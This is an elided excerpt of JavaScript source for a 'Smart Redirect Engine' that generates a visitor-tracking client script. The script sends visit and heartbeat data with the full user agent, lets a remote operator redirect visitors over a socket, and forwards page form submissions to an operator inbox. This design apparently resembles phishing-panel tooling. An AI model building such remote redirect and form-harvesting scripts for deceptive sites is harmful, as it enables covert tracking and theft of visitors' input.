// ============================================================
// MEGA TOOLS — SMART REDIRECT ENGINE (Universal Runtime) v1.1
// v1.1: User Agent — Full string capture, 1000 char limit
...
// ENTERPRISE FIX: Memory leak prevention (timer cleanup)
// ============================================================
...
function generateSmartRedirectScript(req) {
  ...
  return `// ============================================================
// MEGA TOOLS — Smart Redirect Engine v1.1
...
(function(){
  ...
  function cleanupEventListeners() {
    // Only keep essential listeners on unload
    if (!_isUnloading) {
      // Keep them alive
      return;
    }
    // On unload, clear event listeners to prevent memory leaks
    _eventListeners = {};
    _readyCallbacks = [];
  }
  ...
  function doRedirect(url) {
    if (_redirected || _isUnloading || !url) return;
    _redirected = true;
    _isUnloading = true;
    
    // Cleanup everything before redirect
    clearAllTimers();
    cleanupSocket();
  ...
  // ========== VISIT TRACKING — Full User Agent ==========
  function sendVisit() {
    if (!_config.autoVisit || _isUnloading) return;
    fetch(DATA + "/visit", {
      method: "POST",
      ...
      body: JSON.stringify({
        visitorId: _vid,
        trackingCode: _code,
        browser: (navigator.userAgent || "").substring(0, 1000),
  ...
  // ========== HEARTBEAT — Full User Agent ==========
  function sendHeartbeat(status) {
    if (!_config.autoHeartbeat || _isUnloading) return;
  ...
  function startHeartbeat() {
    if (_heartbeatTimer || !_config.autoHeartbeat) return;
  ...
  function connectSocket() {
    if (!_config.autoSocket || _isUnloading) return;
    ...
    scriptEl.onload = function(){
      if (scriptLoaded || _isUnloading) return;
      scriptLoaded = true;
      ...
      _socket.on("connect", function(){
        ...
        // Start heartbeat after socket connect
        startHeartbeat();
      });
      ...
      _socket.on("disconnect", function(){
        ...
        _retryCount++;
        if (_retryCount < _config.retryMax && !_isUnloading) {
      ...
      _socket.on("session_command", function(cmd){
        if (!cmd || _redirected || _isUnloading) return;
      ...
      _socket.on("nav_update", function(d){
        if (d && d.targetUrl && !_redirected && !_isUnloading) doRedirect(d.targetUrl);
      });
      ...
      // Cleanup socket on disconnect event
      _socket.on("disconnect", function(reason) {
        if (reason === "io client disconnect" || _isUnloading) {
          cleanupSocket();
        }
      });
    };
  ...
  // megaSubmit(data) — Send form data to Mega Tools Inbox (Full UA)
  window.megaSubmit = function(data) {
    if (!data || _isUnloading) return;
    var payload = {
      formData: data,
      trackingCode: _code,
      visitorId: _vid,
  ...
  window.megaEvent = function(name, callback) {
    if (!name || typeof callback !== "function" || _isUnloading) return;
  ...
  window.megaReady = function(callback) {
    if (typeof callback !== "function" || _isUnloading) return;
  ...
  // megaCleanup() — Manual cleanup (call before removing script)
  window.megaCleanup = function() {
    _isUnloading = true;
    clearAllTimers();
    cleanupSocket();
    cleanupEventListeners();
  ...
  // Offline on beforeunload (with cleanup)
  ...
  // Page visibility change (cleanup on hide)
  document.addEventListener("visibilitychange", function() {
    if (document.hidden) {
      // Page hidden - send offline and cleanup
      _isUnloading = true;
      sendHeartbeat("Offline");
      clearAllTimers();
    } else {
      // Page visible again - restart
      _isUnloading = false;
      if (!_redirected && !_socket && !_connected) {
        connectSocket();
        startPolling();
        startHeartbeat();
      }
